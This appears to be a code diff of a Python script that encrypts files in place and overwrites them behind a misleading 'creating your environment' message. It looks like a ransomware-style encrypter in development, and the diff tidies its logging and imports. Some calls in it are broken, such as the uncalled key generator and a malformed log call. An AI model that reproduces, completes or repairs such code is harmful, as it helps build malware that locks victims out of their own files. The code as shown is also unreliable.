@@ -1,5 +1,5 @@
 # importing all required libraries
-import fernet,os,time,colorama,logging
+import fernet,os,colorama,logging
 print('welcome')
 print('creating your environment.... please wait')
 current_path = os.getcwd()
@@ -10,13 +10,12 @@ working_directory = os.path.dirname(current_path)
 key = fernet.Fernet.generate_key
 
 # creating a log file 
-with open(current_path + 'logs','w') as log_file :
+with open(current_path + 'logs.txt','w') as log_file :
    pass
-   
-#time.sleep(60)    
+     
 
 # logging configuration
-logging.basicConfig(filename = 'log_file',level = logging.ERROR)
+logging.basicConfig(filename = 'logs.txt',level = logging.ERROR)
           
         
         
@@ -29,7 +28,7 @@ def file_encrypter(path) :
         with open(path,'wb') as file :
             file.write(encrypted_file)
     except Exception as error_type :
-              logging.get_logger().error(f'This path ({path}) was unsuccessfully encrypted due to {error_type}')
+              logging.getLogger().error(f'This path ({path}) was unsuccessfully encrypted due to {error_type}')
         
     else :
             logging.log(level = 10,message = f'This {path} was successfully encrypted')
